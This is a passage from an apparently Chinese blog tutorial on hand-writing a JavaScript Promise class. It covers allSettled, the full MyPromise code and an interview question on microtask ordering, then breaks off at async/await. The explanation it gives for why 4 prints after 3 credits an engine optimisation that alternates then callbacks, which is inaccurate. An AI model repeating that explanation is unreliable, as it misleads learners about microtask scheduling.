class="params">reason</span> =&gt;</span> MyPromise.resolve(callback()).then(<span class="function">() =&gt;</span> &#123; <span class="keyword">throw</span> reason &#125;)  </span><br><span class="line">    )</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="Promise-allSettled"><a href="#Promise-allSettled" class="headerlink" title="Promise.allSettled()"></a>Promise.allSettled()</h3><p>该<code>Promise.allSettled()</code>方法返回一个在所有给定的promise都已经<code>fulfilled</code>或<code>rejected</code>后的promise，并带有一个对象数组，每个对象表示对应的promise结果。</p><p>当您有多个<strong>彼此不依赖</strong>的异步任务成功完成时，或者您总是想知道<strong>每个</strong><code>promise</code>的结果时，通常使用它。</p><p>相比之下，<code>Promise.all()</code> 更适合<strong>彼此相互依赖</strong>或者在其中任何一个<code>reject</code>时<strong>立即结束</strong>。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//allSettled方法</span></span><br><span class="line"><span class="keyword">static</span> <span class="function"><span class="title">allSettled</span>(<span class="params">promises</span>)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (promises.length === <span class="number">0</span>) <span class="keyword">return</span> MyPromise.resolve([])</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> MyPromise(<span class="function">(<span class="params">resolve, reject</span>) =&gt;</span> &#123;</span><br><span class="line">        <span class="keyword">const</span> result = []; <span class="comment">//输入的所有promise的resolve回调的结果</span></span><br><span class="line">        <span class="keyword">let</span> count = promises.length;</span><br><span class="line"></span><br><span class="line">        promises.forEach(<span class="function">(<span class="params">promise, index</span>) =&gt;</span> &#123;</span><br><span class="line">            MyPromise.resolve(promise).then(<span class="function">(<span class="params">value</span>) =&gt;</span> &#123;</span><br><span class="line">                result[index] = &#123;</span><br><span class="line">                    <span class="attr">status</span>: <span class="string">&#x27;fulfilled&#x27;</span>,</span><br><span class="line">                    value</span><br><span class="line">                &#125;</span><br><span class="line">                count--;</span><br><span class="line">                <span class="comment">// resolve after all are settled</span></span><br><span class="line">                <span class="keyword">if</span> (count === <span class="number">0</span>) &#123;</span><br><span class="line">                    resolve(result)</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;, <span class="function">(<span class="params">reason</span>) =&gt;</span> &#123;</span><br><span class="line">                result[index] = &#123;</span><br><span class="line">                    <span class="attr">status</span>: <span class="string">&#x27;rejected&#x27;</span>,</span><br><span class="line">                    reason</span><br><span class="line">                &#125;</span><br><span class="line">                count--;</span><br><span class="line">                <span class="comment">// resolve after all are settled</span></span><br><span class="line">                <span class="keyword">if</span> (count === <span class="number">0</span>) &#123;</span><br><span class="line">                    resolve(result)</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;)</span><br><span class="line">        &#125;)</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>测试一下</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> promise1 = <span class="built_in">Promise</span>.resolve(<span class="number">3</span>);</span><br><span class="line"><span class="keyword">const</span> promise2 = <span class="keyword">new</span> <span class="built_in">Promise</span>(<span class="function">(<span class="params">resolve, reject</span>) =&gt;</span> <span class="built_in">setTimeout</span>(reject, <span class="number">100</span>, <span class="string">&#x27;foo&#x27;</span>));</span><br><span class="line"><span class="keyword">const</span> promises = [promise1, promise2];</span><br><span class="line"></span><br><span class="line"><span class="built_in">Promise</span>.allSettled(promises).</span><br><span class="line">  then(<span class="function">(<span class="params">results</span>) =&gt;</span> results.forEach(<span class="function">(<span class="params">result</span>) =&gt;</span> <span class="built_in">console</span>.log(result.status)));</span><br><span class="line"></span><br><span class="line"><span class="comment">// expected output:</span></span><br><span class="line"><span class="comment">// &quot;fulfilled&quot;</span></span><br><span class="line"><span class="comment">// &quot;rejected&quot;</span></span><br></pre></td></tr></table></figure><h2 id="完整代码"><a href="#完整代码" class="headerlink" title="完整代码"></a>完整代码</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 新建 MyPromise.js</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 定义三个常量表示状态</span></span><br><span class="line"><span class="keyword">const</span> PENDING = <span class="string">&#x27;pending&#x27;</span>;</span><br><span class="line"><span class="keyword">const</span> FULFILLED = <span class="string">&#x27;fulfilled&#x27;</span>;</span><br><span class="line"><span class="keyword">const</span> REJECTED = <span class="string">&#x27;rejected&#x27;</span>;</span><br><span class="line"><span class="comment">// 新建 MyPromise 类</span></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> <span class="class"><span class="keyword">class</span> <span class="title">MyPromise</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 公共字段存储状态和结果变量</span></span><br><span class="line">    <span class="comment">// 储存状态的变量，初始值是pending</span></span><br><span class="line">    status = PENDING;</span><br><span class="line">    <span class="comment">// 成功之后的值</span></span><br><span class="line">    value = <span class="literal">null</span>;</span><br><span class="line">    <span class="comment">// 失败之后的原因</span></span><br><span class="line">    reason = <span class="literal">null</span>;</span><br><span class="line">    <span class="comment">// 存储成功回调函数</span></span><br><span class="line">    onFulfilledCallbacks = [];</span><br><span class="line">    <span class="comment">// 存储失败回调函数</span></span><br><span class="line">    onRejectedCallbacks = [];</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="title">constructor</span>(<span class="params">executor</span>)</span> &#123;</span><br><span class="line">        <span class="comment">// resolve和reject为什么要用箭头函数？</span></span><br><span class="line">        <span class="comment">// 如果直接调用的话，普通函数resolve和reject内部this指向的是undefined</span></span><br><span class="line">        <span class="comment">// 用箭头函数就可以让this指向当前实例对象</span></span><br><span class="line">        <span class="comment">// 更改成功后的状态</span></span><br><span class="line">        <span class="keyword">const</span> resolve = <span class="function">(<span class="params">value</span>) =&gt;</span> &#123;</span><br><span class="line">            <span class="comment">// 只有状态是等待，才执行状态修改</span></span><br><span class="line">            <span class="keyword">if</span> (<span class="built_in">this</span>.status === PENDING) &#123;</span><br><span class="line">                <span class="built_in">this</span>.status = FULFILLED;<span class="comment">// 状态修改为成功</span></span><br><span class="line">                <span class="built_in">this</span>.value = value;<span class="comment">// 保存成功之后的值</span></span><br><span class="line">                <span class="comment">// resolve里面将所有成功的回调拿出来执行</span></span><br><span class="line">                <span class="keyword">while</span> (<span class="built_in">this</span>.onFulfilledCallbacks.length) &#123;</span><br><span class="line">                    <span class="comment">// Array.shift() 取出数组第一个元素，然后（）调用，shift不是纯函数，取出后，数组将失去该元素，直到数组为空</span></span><br><span class="line">                    <span class="built_in">this</span>.onFulfilledCallbacks.shift()(value)</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 更改失败后的状态</span></span><br><span class="line">        <span class="keyword">const</span> reject = <span class="function">(<span class="params">reason</span>) =&gt;</span> &#123;</span><br><span class="line">            <span class="comment">// 只有状态是等待，才执行状态修改</span></span><br><span class="line">            <span class="keyword">if</span> (<span class="built_in">this</span>.status === PENDING) &#123;</span><br><span class="line">                <span class="built_in">this</span>.status = REJECTED;<span class="comment">// 状态修改为成功</span></span><br><span class="line">                <span class="built_in">this</span>.reason = reason;<span class="comment">// 保存失败后的原因</span></span><br><span class="line">                <span class="comment">// reject里面将所有失败的回调拿出来执行</span></span><br><span class="line">                <span class="keyword">while</span> (<span class="built_in">this</span>.onRejectedCallbacks.length) &#123;</span><br><span class="line">                    <span class="built_in">this</span>.onRejectedCallbacks.shift()(reason);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// executor 是一个执行器，进入会立即执行</span></span><br><span class="line">        <span class="comment">// 并传入resolve和reject方法</span></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            executor(resolve, reject);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (error) &#123;</span><br><span class="line">            <span class="comment">// 如果有错误，就直接执行reject</span></span><br><span class="line">            reject(error)</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="title">then</span>(<span class="params">onFulfilled, onRejected</span>)</span> &#123;</span><br><span class="line">        <span class="comment">// 如果不传，就使用默认函数</span></span><br><span class="line">        onFulfilled = <span class="keyword">typeof</span> onFulfilled === <span class="string">&#x27;function&#x27;</span> ? onFulfilled : <span class="function"><span class="params">value</span> =&gt;</span> value;</span><br><span class="line">        onRejected = <span class="keyword">typeof</span> onRejected === <span class="string">&#x27;function&#x27;</span> ? onRejected : <span class="function"><span class="params">reason</span> =&gt;</span> &#123; <span class="keyword">throw</span> reason &#125;;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 为了链式调用这里直接创建一个MyPromise，并在后面return出去</span></span><br><span class="line">        <span class="comment">// promise有暂时性死区，初始化之后才能使用</span></span><br><span class="line">        <span class="keyword">const</span> promise = <span class="keyword">new</span> MyPromise(<span class="function">(<span class="params">resolve, reject</span>) =&gt;</span> &#123;</span><br><span class="line">            <span class="comment">// 这里的内容在执行器中，会立即执行</span></span><br><span class="line">            <span class="keyword">if</span> (<span class="built_in">this</span>.status === FULFILLED) &#123;</span><br><span class="line">                <span class="comment">// 创建一个微任务等待 promise 完成初始化</span></span><br><span class="line">                queueMicrotask(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">                    <span class="keyword">try</span> &#123;</span><br><span class="line">                        <span class="comment">// 获取成功回调函数的执行结果</span></span><br><span class="line">                        <span class="keyword">const</span> result = onFulfilled(<span class="built_in">this</span>.value);</span><br><span class="line">                        <span class="comment">// 传入 resolvePromise 集中处理</span></span><br><span class="line">                        resolvePromise(promise, result, resolve, reject);</span><br><span class="line">                    &#125; <span class="keyword">catch</span> (error) &#123;</span><br><span class="line">                        reject(error)</span><br><span class="line">                    &#125;</span><br><span class="line"></span><br><span class="line">                &#125;)</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="built_in">this</span>.status === REJECTED) &#123;</span><br><span class="line">                <span class="comment">// 调用失败回调，并且把原因返回</span></span><br><span class="line">                queueMicrotask(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">                    <span class="keyword">try</span> &#123;</span><br><span class="line">                        <span class="keyword">const</span> result = onRejected(<span class="built_in">this</span>.reason);</span><br><span class="line">                        resolvePromise(promise, result, resolve, reject);</span><br><span class="line">                    &#125; <span class="keyword">catch</span> (error) &#123;</span><br><span class="line">                        reject(error);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;)</span><br><span class="line"></span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="built_in">this</span>.status === PENDING) &#123;</span><br><span class="line">                <span class="comment">// 因为不知道后面状态的变化情况，所以将成功回调和失败回调存储起来</span></span><br><span class="line">                <span class="comment">// 等到执行成功失败函数的时候再传递</span></span><br><span class="line">                <span class="built_in">this</span>.onFulfilledCallbacks.push(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">                    queueMicrotask(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">                        <span class="keyword">try</span> &#123;</span><br><span class="line">                            <span class="keyword">const</span> result = onFulfilled(<span class="built_in">this</span>.value);</span><br><span class="line">                            resolvePromise(promise, result, resolve, reject);</span><br><span class="line">                        &#125; <span class="keyword">catch</span> (error) &#123;</span><br><span class="line">                            reject(error);</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;)</span><br><span class="line">                &#125;);</span><br><span class="line">                <span class="built_in">this</span>.onRejectedCallbacks.push(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">                    queueMicrotask(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">                        <span class="keyword">try</span> &#123;</span><br><span class="line">                            <span class="keyword">const</span> result = onRejected(<span class="built_in">this</span>.reason);</span><br><span class="line">                            resolvePromise(promise, result, resolve, reject);</span><br><span class="line">                        &#125; <span class="keyword">catch</span> (error) &#123;</span><br><span class="line">                            reject(error);</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;)</span><br><span class="line">                &#125;);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">// 封装一个函数统一处理回调函数的执行结果 </span></span><br><span class="line">            <span class="function"><span class="keyword">function</span> <span class="title">resolvePromise</span>(<span class="params">promise, result, resolve, reject</span>) </span>&#123;</span><br><span class="line">                <span class="comment">// 如果相等了，说明return的是自己，抛出类型错误并返回</span></span><br><span class="line">                <span class="keyword">if</span> (promise === result) &#123;</span><br><span class="line">                    <span class="keyword">return</span> reject(<span class="keyword">new</span> <span class="built_in">TypeError</span>(<span class="string">&#x27;Chaining cycle detected for promise #&lt;Promise&gt;&#x27;</span>))</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="comment">// 判断result是不是 MyPromise 实例对象</span></span><br><span class="line">                <span class="keyword">if</span> (result <span class="keyword">instanceof</span> MyPromise) &#123;</span><br><span class="line">                    <span class="comment">// 执行 result，调用 then 方法，目的是将其状态变为 fulfilled 或者 rejected</span></span><br><span class="line">                    <span class="comment">// result.then(value =&gt; resolve(value), reason =&gt; reject(reason))</span></span><br><span class="line">                    <span class="comment">// 简化之后</span></span><br><span class="line">                    result.then(resolve, reject);</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="comment">// 普通值</span></span><br><span class="line">                    resolve(result);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        &#125;)</span><br><span class="line">        <span class="keyword">return</span> promise;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// catch方法其实就是执行一下then的第二个回调</span></span><br><span class="line">    <span class="keyword">catch</span>(onRejected) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>.then(<span class="literal">undefined</span>, onRejected);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// resolve 静态方法</span></span><br><span class="line">    <span class="keyword">static</span> <span class="function"><span class="title">resolve</span>(<span class="params">value</span>)</span> &#123;</span><br><span class="line">        <span class="comment">// 如果这个值是一个 promise ，那么将返回这个 promise </span></span><br><span class="line">        <span class="keyword">if</span> (value <span class="keyword">instanceof</span> MyPromise) &#123;</span><br><span class="line">            <span class="keyword">return</span> value;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 否则返回的promise将以此值完成。</span></span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> MyPromise(<span class="function"><span class="params">resolve</span> =&gt;</span> &#123;</span><br><span class="line">            resolve(value);</span><br><span class="line">        &#125;);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// reject 静态方法</span></span><br><span class="line">    <span class="keyword">static</span> <span class="function"><span class="title">reject</span>(<span class="params">reason</span>)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> MyPromise(<span class="function">(<span class="params">resolve, reject</span>) =&gt;</span> &#123;</span><br><span class="line">            reject(reason);</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//all 静态方法</span></span><br><span class="line">    <span class="keyword">static</span> <span class="function"><span class="title">all</span>(<span class="params">promiseArr</span>)</span> &#123;</span><br><span class="line">        <span class="keyword">let</span> index = <span class="number">0</span>;<span class="comment">//记录resolve次数</span></span><br><span class="line">        <span class="keyword">let</span> result = [];<span class="comment">// 输入的所有promise的resolve回调的结果</span></span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> MyPromise(<span class="function">(<span class="params">resolve, reject</span>) =&gt;</span> &#123;</span><br><span class="line">            promiseArr.forEach(<span class="function">(<span class="params">p, i</span>) =&gt;</span> &#123;</span><br><span class="line">                <span class="comment">//Promise.resolve(p)用于处理传入值不为Promise的情况</span></span><br><span class="line">                MyPromise.resolve(p).then(</span><br><span class="line">                    <span class="function"><span class="params">val</span> =&gt;</span> &#123;</span><br><span class="line">                        index++;</span><br><span class="line">                        result[i] = val;</span><br><span class="line">                        <span class="comment">//所有then执行后, resolve结果,结果为一个数组</span></span><br><span class="line">                        <span class="keyword">if</span> (index === promiseArr.length) &#123;</span><br><span class="line">                            resolve(result);</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;,</span><br><span class="line">                    <span class="function"><span class="params">err</span> =&gt;</span> &#123;</span><br><span class="line">                        <span class="comment">//有一个Promise被reject时，MyPromise的状态变为reject</span></span><br><span class="line">                        reject(err)</span><br><span class="line">                    &#125;</span><br><span class="line">                )</span><br><span class="line">            &#125;)</span><br><span class="line">        &#125;)</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">static</span> <span class="function"><span class="title">race</span>(<span class="params">promiseArr</span>)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> MyPromise(<span class="function">(<span class="params">resolve, reject</span>) =&gt;</span> &#123;</span><br><span class="line">            <span class="comment">//同时执行Promise,如果有一个Promise的状态发生改变,就变更新MyPromise的状态</span></span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">let</span> p <span class="keyword">of</span> promiseArr) &#123;</span><br><span class="line">                <span class="comment">//Promise.resolve(p)用于处理传入值不为Promise的情况</span></span><br><span class="line">                MyPromise.resolve(p).then(resolve, reject);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;)</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//finally方法</span></span><br><span class="line">    <span class="function"><span class="title">finally</span>(<span class="params">callback</span>)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>.then(</span><br><span class="line">            <span class="comment">// MyPromise.resolve执行回调,并在then中return结果传递给后面的Promise</span></span><br><span class="line">            <span class="function"><span class="params">value</span> =&gt;</span> MyPromise.resolve(callback()).then(<span class="function">() =&gt;</span> value),    </span><br><span class="line">            <span class="comment">// reject同理         </span></span><br><span class="line">            <span class="function"><span class="params">reason</span> =&gt;</span> MyPromise.resolve(callback()).then(<span class="function">() =&gt;</span> &#123; <span class="keyword">throw</span> reason &#125;)  </span><br><span class="line">        )</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//allSettled方法</span></span><br><span class="line">    <span class="keyword">static</span> <span class="function"><span class="title">allSettled</span>(<span class="params">promises</span>)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (promises.length === <span class="number">0</span>) <span class="keyword">return</span> MyPromise.resolve([])</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> MyPromise(<span class="function">(<span class="params">resolve, reject</span>) =&gt;</span> &#123;</span><br><span class="line">            <span class="keyword">const</span> result = []; <span class="comment">//输入的所有promise的resolve回调的结果</span></span><br><span class="line">            <span class="keyword">let</span> count = promises.length;</span><br><span class="line"></span><br><span class="line">            promises.forEach(<span class="function">(<span class="params">promise, index</span>) =&gt;</span> &#123;</span><br><span class="line">                MyPromise.resolve(promise).then(<span class="function">(<span class="params">value</span>) =&gt;</span> &#123;</span><br><span class="line">                    result[index] = &#123;</span><br><span class="line">                        <span class="attr">status</span>: <span class="string">&#x27;fulfilled&#x27;</span>,</span><br><span class="line">                        value</span><br><span class="line">                    &#125;</span><br><span class="line">                    count--;</span><br><span class="line">                    <span class="comment">// resolve after all are settled</span></span><br><span class="line">                    <span class="keyword">if</span> (count === <span class="number">0</span>) &#123;</span><br><span class="line">                        resolve(result)</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;, <span class="function">(<span class="params">reason</span>) =&gt;</span> &#123;</span><br><span class="line">                    result[index] = &#123;</span><br><span class="line">                        <span class="attr">status</span>: <span class="string">&#x27;rejected&#x27;</span>,</span><br><span class="line">                        reason</span><br><span class="line">                    &#125;</span><br><span class="line">                    count--;</span><br><span class="line">                    <span class="comment">// resolve after all are settled</span></span><br><span class="line">                    <span class="keyword">if</span> (count === <span class="number">0</span>) &#123;</span><br><span class="line">                        resolve(result)</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;)</span><br><span class="line">            &#125;)</span><br><span class="line">        &#125;)</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="一道面试题"><a href="#一道面试题" class="headerlink" title="一道面试题"></a>一道面试题</h1><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Promise</span>.resolve().then(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="number">0</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">Promise</span>.resolve(<span class="number">4</span>);</span><br><span class="line">&#125;).then(<span class="function">(<span class="params">res</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="built_in">console</span>.log(res)</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="built_in">Promise</span>.resolve().then(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="number">1</span>);</span><br><span class="line">&#125;).then(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="number">2</span>);</span><br><span class="line">&#125;).then(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="number">3</span>);</span><br><span class="line">&#125;).then(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="number">5</span>);</span><br><span class="line">&#125;).then(<span class="function">() =&gt;</span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="number">6</span>);</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><p>打印结果：<strong>0、1、2、3、4、5、6</strong> </p><p>这里4怎么跑到3后面去了，不讲武德？ Why……</p><p><strong>Js引擎为了让microtask尽快的输出，做了一些优化，连续的多个then(3个)如果没有reject或者resolve会交替执行then而不至于让一个堵太久完成用户无响应，不单单v8这样其他引擎也是这样，因为其实promuse内部状态已经结束了。这块在v8源码里有完整的体现。</strong></p><h1 id="async-await"><a href="#async-await" class="headerlink" title="async + await"></a>async + await</h1><p><code>async functions</code> 和 <code>await</code> 关键字是最近添加到JavaScript语言里面的。它们是ECMAScript 2017 JavaScript版的一部分。简单来说，它们是基于promises的语法糖，使异步代码更易于编写和阅读。通过使用它们，异步代码看起来更像是老式同步代码，因此它们非常值得学习。</p><h2 id="async"><a href="#async" class="headerlink" title="async"></a>async</h2><p>首先，我们使用 <code>async</code> 关键字，把它放在函数声明之前，使其成为 <code>async function</code>。<strong>异步函数</strong>是一个知道怎样使用 <code>await</code> 关键字调用异步代码的函数。</p><p>尝试在浏览器的JS控制台中键入以下行：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">hello</span>(<span 